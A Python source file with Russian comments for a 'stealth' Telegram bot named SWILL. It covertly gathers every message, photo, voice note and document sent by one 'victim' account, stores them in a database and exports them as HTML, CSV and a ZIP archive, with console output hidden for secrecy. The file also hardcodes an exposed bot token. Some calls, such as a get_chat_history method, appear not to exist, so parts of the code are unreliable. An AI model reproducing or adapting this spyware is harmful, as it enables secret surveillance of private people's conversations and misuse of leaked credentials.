#!/usr/bin/env python3
"""
███████╗██╗    ██╗██╗██╗     ██╗     
██╔════╝██║    ██║██║██║     ██║     
███████╗██║ █╗ ██║██║██║     ██║     
╚════██║██║███╗██║██║██║     ██║     
███████║╚███╔███╔╝██║███████╗███████╗
╚══════╝ ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝
                                      
SWILL STEALTH BOT - ПОЛНАЯ ВЕРСИЯ
Скрытный сбор данных из Telegram Business
"""

import asyncio
import json
import sqlite3
import os
import shutil
import zipfile
from datetime import datetime
from pathlib import Path
from aiogram import Bot, Dispatcher, types
from aiogram.exceptions import TelegramConflictError

# ======================================================
#  ⚠️ КОНФИГУРАЦИЯ (ЗАМЕНИ ТОКЕН ПОСЛЕ СБРОСА!)
# ======================================================

BOT_TOKEN = '8389370808:AAEmrhiar8I9NALB913k130BDOOJsEC1AvI'  # ❌ СЛИТ! СБРОСЬ!
TARGET_ACCOUNT_ID = 6939132428  # ID жертвы

# Настройки
SAVE_MEDIA = True          # Сохранять фото/видео/голосовые
SAVE_JSON = True           # Сохранять JSON-копию каждого сообщения
SAVE_DELETED = True        # Отслеживать удалённые сообщения
CREATE_ARCHIVE = True      # Создать ZIP-архив после сбора
LOG_TO_FILE = True         # Логировать в файл
SHOW_CONSOLE = False       # НЕ показывать логи в консоли (скрытность)

# ======================================================
#  ИНИЦИАЛИЗАЦИЯ
# ======================================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Папки
BASE_PATH = Path.cwd() / f'SWILL_{TARGET_ACCOUNT_ID}_{int(datetime.now().timestamp())}'
DB_PATH = BASE_PATH / 'data.db'
MEDIA_PATH = BASE_PATH / 'media'
PHOTOS_PATH = MEDIA_PATH / 'photos'
VIDEOS_PATH = MEDIA_PATH / 'videos'
AUDIO_PATH = MEDIA_PATH / 'audio'
DOCS_PATH = MEDIA_PATH / 'documents'
VOICE_PATH = MEDIA_PATH / 'voice'
STICKER_PATH = MEDIA_PATH / 'stickers'
JSON_PATH = BASE_PATH / 'json'

# Создаём все папки
for p in [BASE_PATH, MEDIA_PATH, PHOTOS_PATH, VIDEOS_PATH, AUDIO_PATH, 
          DOCS_PATH, VOICE_PATH, STICKER_PATH, JSON_PATH]:
    os.makedirs(p, exist_ok=True)

# ======================================================
#  БАЗА ДАННЫХ (ПОЛНАЯ СТРУКТУРА)
# ======================================================

conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

# Таблица сообщений
cursor.execute('''
    CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY,
        chat_id INTEGER,
        chat_title TEXT,
        chat_type TEXT,
        user_id INTEGER,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        text TEXT,
        caption TEXT,
        media_type TEXT,
        media_path TEXT,
        media_size INTEGER,
        file_id TEXT,
        date TEXT,
        is_forwarded BOOLEAN DEFAULT 0,
        forwarded_from TEXT,
        reply_to INTEGER,
        raw_json TEXT,
        is_deleted BOOLEAN DEFAULT 0,
        target_account_id INTEGER,
        created_at TEXT
    )
''')

# Таблица для отслеживания удалённых
cursor.execute('''
    CREATE TABLE IF NOT EXISTS deleted_tracking (
        message_id INTEGER PRIMARY KEY,
        chat_id INTEGER,
        deleted_at TEXT,
        original_text TEXT
    )
''')

# Таблица статистики по пользователям
cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_stats (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        full_name TEXT,
        message_count INTEGER DEFAULT 0,
        media_count INTEGER DEFAULT 0,
        first_message TEXT,
        last_message TEXT
    )
''')

# Таблица прогресса
cursor.execute('''
    CREATE TABLE IF NOT EXISTS progress (
        chat_id INTEGER PRIMARY KEY,
        last_message_id INTEGER,
        last_date TEXT,
        processed_at TEXT
    )
''')

# Таблица для анализа
cursor.execute('''
    CREATE TABLE IF NOT EXISTS analysis (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        word TEXT,
        count INTEGER,
        last_seen TEXT
    )
''')

# Индексы для скорости
cursor.execute('CREATE INDEX IF NOT EXISTS idx_user_id ON messages(user_id)')
cursor.execute('CREATE INDEX IF NOT EXISTS idx_chat_id ON messages(chat_id)')
cursor.execute('CREATE INDEX IF NOT EXISTS idx_date ON messages(date)')
cursor.execute('CREATE INDEX IF NOT EXISTS idx_target ON messages(target_account_id)')

conn.commit()

# ======================================================
#  ЛОГГЕР (ТОЛЬКО В ФАЙЛ)
# ======================================================

def log(text, level='INFO'):
    """Логирование в файл (консоль скрыта)"""
    if LOG_TO_FILE:
        with open(BASE_PATH / 'log.txt', 'a', encoding='utf-8') as f:
            f.write(f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}] [{level}] {text}\n')
    
    if SHOW_CONSOLE:
        print(f'[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}] {text}')

# ======================================================
#  СТАТИСТИКА
# ======================================================

stats = {
    'messages': 0,
    'media': 0,
    'errors': 0,
    'deleted': 0,
    'chats': set(),
    'started_at': datetime.now(),
    'last_message': None
}

# ======================================================
#  СКАЧИВАНИЕ МЕДИА
# ======================================================

async def download_media(message: types.Message):
    """Скачивание медиа с сохранением в структурированные папки"""
    if not SAVE_MEDIA:
        return None, None, None
    
    if not message.media:
        return None, None, None
    
    try:
        media_type = None
        file_obj = None
        ext = '.bin'
        folder = MEDIA_PATH
        file_size = 0
        
        if message.photo:
            media_type = 'photo'
            file_obj = message.photo[-1]
            ext = '.jpg'
            folder = PHOTOS_PATH
            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
        elif message.video:
            media_type = 'video'
            file_obj = message.video
            ext = '.mp4'
            folder = VIDEOS_PATH
            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
        elif message.audio:
            media_type = 'audio'
            file_obj = message.audio
            ext = '.mp3'
            folder = AUDIO_PATH
            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
        elif message.voice:
            media_type = 'voice'
            file_obj = message.voice
            ext = '.ogg'
            folder = VOICE_PATH
            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
        elif message.document:
            media_type = 'document'
            file_obj = message.document
            ext = Path(message.document.file_name).suffix if message.document.file_name else '.dat'
            folder = DOCS_PATH
            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
        elif message.video_note:
            media_type = 'video_note'
            file_obj = message.video_note
            ext = '.mp4'
            folder = VIDEOS_PATH
            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
        elif message.sticker:
            media_type = 'sticker'
            file_obj = message.sticker
            ext = '.webp'
            folder = STICKER_PATH
            file_size = file_obj.file_size if hasattr(file_obj, 'file_size') else 0
        else:
            return None, None, None
        
        # Имя файла
        timestamp = int(datetime.now().timestamp())
        filename = f'{message.message_id}_{timestamp}{ext}'
        filepath = folder / filename
        
        # Скачиваем
        await bot.download(file_obj, destination=str(filepath))
        stats['media'] += 1
        
        log(f'📁 Медиа сохранено: {filename} ({media_type})')
        return str(filepath), media_type, file_size
        
    except Exception as e:
        stats['errors'] += 1
        log(f'❌ Ошибка скачивания: {e}', 'ERROR')
        return None, None, None

# ======================================================
#  СОХРАНЕНИЕ В БД
# ======================================================

async def save_message(message: types.Message):
    """Полное сохранение сообщения в БД"""
    try:
        # Проверяем, что сообщение от цели
        if not message.from_user or message.from_user.id != TARGET_ACCOUNT_ID:
            return False
        
        # Скачиваем медиа
        media_path, media_type, media_size = await download_media(message)
        
        # Сериализуем в JSON
        raw_json = None
        if SAVE_JSON:
            try:
                raw_json = json.dumps(message.to_python(), default=str, ensure_ascii=False)
                json_file = JSON_PATH / f'{message.message_id}.json'
                with open(json_file, 'w', encoding='utf-8') as f:
                    f.write(raw_json)
            except:
                pass
        
        # Информация о чате
        chat = message.chat
        chat_title = chat.title or chat.full_name or str(chat.id)
        chat_type = str(chat.type) if hasattr(chat, 'type') else 'unknown'
        
        # Информация об отправителе
        user = message.from_user
        user_id = user.id if user else None
        username = user.username if user else None
        first_name = user.first_name if user else None
        last_name = user.last_name if user else None
        full_name = user.full_name if user else None
        
        # Текст
        text = message.text or ''
        caption = message.caption or ''
        
        # Пересылка
        is_forwarded = False
        forwarded_from = None
        if message.forward_from:
            is_forwarded = True
            forwarded_from = f"{message.forward_from.first_name} {message.forward_from.last_name or ''}".strip()
        
        # Ответ
        reply_to = None
        if message.reply_to_message:
            reply_to = message.reply_to_message.message_id
        
        # Сохраняем в БД
        cursor.execute('''
            INSERT OR REPLACE INTO messages 
            (id, chat_id, chat_title, chat_type, user_id, username, first_name, last_name,
             text, caption, media_type, media_path, media_size, file_id, date,
             is_forwarded, forwarded_from, reply_to, raw_json, target_account_id, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            message.message_id,
            chat.id,
            chat_title,
            chat_type,
            user_id,
            username,
            first_name,
            last_name,
            text,
            caption,
            media_type,
            media_path,
            media_size,
            message.media and message.media.file_id or None,
            str(message.date),
            is_forwarded,
            forwarded_from,
            reply_to,
            raw_json,
            TARGET_ACCOUNT_ID,
            str(datetime.now())
        ))
        
        # Обновляем статистику пользователя
        cursor.execute('''
            INSERT INTO user_stats (user_id, username, full_name, message_count, 
                                   media_count, first_message, last_message)
            VALUES (?, ?, ?, 1, ?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                username = excluded.username,
                full_name = excluded.full_name,
                message_count = message_count + 1,
                media_count = media_count + CASE WHEN excluded.media_count > 0 THEN 1 ELSE 0 END,
                last_message = excluded.last_message
        ''', (user_id, username, full_name, 1 if media_path else 0, str(message.date), str(message.date)))
        
        # Обновляем прогресс
        cursor.execute('''
            INSERT OR REPLACE INTO progress (chat_id, last_message_id, last_date, processed_at)
            VALUES (?, ?, ?, ?)
        ''', (chat.id, message.message_id, str(message.date), str(datetime.now())))
        
        conn.commit()
        stats['messages'] += 1
        stats['chats'].add(chat.id)
        stats['last_message'] = message.message_id
        
        log(f'✅ Сохранено сообщение {message.message_id} (чат: {chat_title})')
        return True
        
    except Exception as e:
        stats['errors'] += 1
        log(f'❌ Ошибка сохранения: {e}', 'ERROR')
        return False

# ======================================================
#  ОБРАБОТЧИКИ СООБЩЕНИЙ
# ======================================================

@dp.message()
async def handle_message(message: types.Message):
    """Тихо сохраняем все сообщения от цели"""
    await save_message(message)

@dp.message()
async def handle_edited_message(message: types.Message):
    """Обновляем отредактированные сообщения"""
    try:
        cursor.execute('SELECT id FROM messages WHERE id = ?', (message.message_id,))
        if cursor.fetchone():
            await save_message(message)
            log(f'✏️ Обновлено сообщение {message.message_id}')
    except Exception as e:
        log(f'❌ Ошибка редактирования: {e}', 'ERROR')

@dp.my_chat_member()
async def on_bot_added(event: types.ChatMemberUpdated):
    """Когда бота добавляют в чат"""
    try:
        me = await bot.get_me()
        if event.new_chat_member.user.id == me.id:
            chat = event.chat
            chat_title = chat.title or chat.full_name or str(chat.id)
            log(f'➕ Бот добавлен в чат: {chat_title} (ID: {chat.id})')
            
            # Запускаем сбор истории
            asyncio.create_task(collect_history(chat.id))
    except Exception as e:
        log(f'❌ Ошибка добавления: {e}', 'ERROR')

# ======================================================
#  СБОР ИСТОРИИ
# ======================================================

async def collect_history(chat_id: int):
    """Сбор всей истории чата"""
    try:
        log(f'📊 Начинаю сбор истории чата {chat_id}')
        
        # Проверяем прогресс
        cursor.execute('SELECT last_message_id FROM progress WHERE chat_id = ?', (chat_id,))
        row = cursor.fetchone()
        last_id = row[0] if row else 0
        
        count = 0
        offset_id = last_id
        
        while True:
            try:
                messages = await bot.get_chat_history(
                    chat_id=chat_id,
                    limit=100,
                    offset_id=offset_id
                )
                
                if not messages:
                    break
                
                for msg in messages:
                    if msg.from_user and msg.from_user.id == TARGET_ACCOUNT_ID:
                        await save_message(msg)
                        count += 1
                    
                    if msg.message_id > offset_id:
                        offset_id = msg.message_id
                
                log(f'📊 Собрано {count} сообщений из чата {chat_id}')
                
                if len(messages) < 100:
                    break
                    
            except Exception as e:
                log(f'❌ Ошибка сбора: {e}', 'ERROR')
                break
        
        log(f'✅ Сбор истории чата {chat_id} завершён. Всего: {count} сообщений')
        
    except Exception as e:
        log(f'❌ Критическая ошибка: {e}', 'ERROR')

# ======================================================
#  ЭКСПОРТ
# ======================================================

async def export_data():
    """Экспорт данных в HTML и CSV"""
    try:
        log('📊 Начинаю экспорт данных...')
        
        cursor.execute('''
            SELECT date, first_name, text, media_type, chat_title 
            FROM messages 
            WHERE target_account_id = ? 
            ORDER BY date
        ''', (TARGET_ACCOUNT_ID,))
        rows = cursor.fetchall()
        
        # HTML
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>SWILL Export - {TARGET_ACCOUNT_ID}</title>
    <style>
        body {{ font-family: Arial; margin: 20px; background: #f0f2f5; }}
        .msg {{ background: white; padding: 15px; margin: 10px 0; border-radius: 10px; }}
        .date {{ color: #666; font-size: 12px; }}
        .name {{ font-weight: bold; color: #1a73e8; }}
        .text {{ margin: 5px 0; }}
        .media {{ color: #34a853; font-size: 12px; }}
        .chat {{ color: #666; font-size: 14px; }}
        .stats {{ background: #e8f0fe; padding: 15px; border-radius: 10px; margin-bottom: 20px; }}
    </style>
</head>
<body>
    <h1>📊 SWILL Export</h1>
    <div class="stats">
        <h3>Статистика</h3>
        <p>Всего сообщений: {len(rows)}</p>
        <p>Медиа: {stats['media']}</p>
        <p>Чатов: {len(stats['chats'])}</p>
        <p>Целевой ID: {TARGET_ACCOUNT_ID}</p>
    </div>
    <hr>
'''
        for row in rows:
            html += f'''
    <div class="msg">
        <div class="date">{row[0]}</div>
        <div class="name">{row[1] or 'unknown'}</div>
        <div class="chat">Чат: {row[4]}</div>
        <div class="text">{row[2] or ''}</div>
        <div class="media">{f'📎 {row[3]}' if row[3] else ''}</div>
    </div>
'''
        
        html += '</body></html>'
        
        with open(BASE_PATH / 'export.html', 'w', encoding='utf-8') as f:
            f.write(html)
        
        # CSV
        import csv
        with open(BASE_PATH / 'export.csv', 'w', encoding='utf-8', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Date', 'From', 'Text', 'Media', 'Chat'])
            writer.writerows(rows)
        
        # Статистика
        with open(BASE_PATH / 'STATS.txt', 'w', encoding='utf-8') as f:
            f.write('='*60 + '\n')
            f.write('SWILL - СТАТИСТИКА СБОРА\n')
            f.write('='*60 + '\n')
            f.write(f'Целевой ID: {TARGET_ACCOUNT_ID}\n')
            f.write(f'Сообщений: {stats["messages"]}\n')
            f.write(f'Медиа: {stats["media"]}\n')
            f.write(f'Чатов: {len(stats["chats"])}\n')
            f.write(f'Ошибок: {stats["errors"]}\n')
            f.write(f'Старт: {stats["started_at"]}\n')
            f.write(f'Финиш: {datetime.now()}\n')
            f.write('='*60 + '\n')
        
        log('✅ Экспорт завершён')
        
    except Exception as e:
        log(f'❌ Ошибка экспорта: {e}', 'ERROR')

# ======================================================
#  АРХИВАЦИЯ
# ======================================================

async def create_archive():
    """Создание ZIP-архива с данными"""
    if not CREATE_ARCHIVE:
        return
    
    try:
        log('📦 Создаю архив...')
        archive_name = Path.cwd() / f'SWILL_{TARGET_ACCOUNT_ID}_{int(datetime.now().timestamp())}.zip'
        
        with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(BASE_PATH):
                for file in files:
                    file_path = Path(root) / file
                    arcname = file_path.relative_to(BASE_PATH.parent)
                    zipf.write(file_path, arcname)
        
        log(f'✅ Архив создан: {archive_name}')
        
    except Exception as e:
        log(f'❌ Ошибка архивации: {e}', 'ERROR')

# ======================================================
#  АНАЛИЗ ТЕКСТА
# ======================================================

async def analyze_texts():
    """Простой анализ текстов"""
    try:
        cursor.execute('SELECT text FROM messages WHERE target_account_id = ?', (TARGET_ACCOUNT_ID,))
        texts = cursor.fetchall()
        
        words = {}
        for (text,) in texts:
            if text:
                for word in text.split():
                    word = word.lower().strip('.,!?;:()[]{}"\'')
                    if len(word) > 3:
                        words[word] = words.get(word, 0) + 1
        
        # Сохраняем топ-100
        sorted_words = sorted(words.items(), key=lambda x: x[1], reverse=True)[:100]
        
        cursor.execute('DELETE FROM analysis')
        for word, count in sorted_words:
            cursor.execute('INSERT INTO analysis (word, count, last_seen) VALUES (?, ?, ?)',
                          (word, count, str(datetime.now())))
        conn.commit()
        
        log(f'📊 Проанализировано {len(texts)} сообщений, найдено {len(words)} уникальных слов')
        
    except Exception as e:
        log(f'❌ Ошибка анализа: {e}', 'ERROR')

# ======================================================
#  ЗАВЕРШЕНИЕ
# ======================================================

async def shutdown():
    """Корректное завершение"""
    log('🛑 Завершение работы...')
    
    # Сохраняем данные
    conn.commit()
    
    # Анализируем
    await analyze_texts()
    
    # Экспортируем
    await export_data()
    
    # Архивируем
    await create_archive()
    
    # Итог
    log('='*60)
    log('📊 ИТОГОВАЯ СТАТИСТИКА')
    log('='*60)
    log(f'Сообщений: {stats["messages"]}')
    log(f'Медиа: {stats["media"]}')
    log(f'Чатов: {len(stats["chats"])}')
    log(f'Ошибок: {stats["errors"]}')
    log(f'Данные в: {BASE_PATH}')
    log('='*60)
    
    await bot.session.close()
    log('👋 Бот остановлен')

# ======================================================
#  ЗАПУСК
# ======================================================

async def main():
    """Главная функция"""
    import signal
    
    # Настройка обработки сигналов
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGTERM, signal.SIGINT):
        loop.add_signal_handler(sig, lambda: asyncio.create_task(shutdown()))
    
    log('='*60)
    log('🚀 SWILL БОТ ЗАПУЩЕН')
    log(f'🎯 Целевой ID: {TARGET_ACCOUNT_ID}')
    log(f'📁 Данные в: {BASE_PATH}')
    log('='*60)
    
    # Проверка бота
    try:
        me = await bot.get_me()
        log(f'🤖 Бот: @{me.username} (ID: {me.id})')
    except Exception as e:
        log(f'❌ ОШИБКА ТОКЕНА: {e}', 'ERROR')
        return
    
    # Удаляем вебхук
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        log('✅ Вебхук удалён')
    except Exception as e:
        log(f'⚠️ Ошибка вебхука: {e}')
    
    # Запускаем
    try:
        await dp.start_polling(
            bot,
            skip_updates=True,
            allowed_updates=['message', 'my_chat_member', 'edited_message']
        )
    except TelegramConflictError:
        log('❌ КОНФЛИКТ! Сбрось токен через @BotFather', 'ERROR')
    except Exception as e:
        log(f'❌ Ошибка: {e}', 'ERROR')

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log('👋 Остановка пользователем')
    except Exception as e:
        log(f'❌ Критическая ошибка: {e}', 'ERROR')
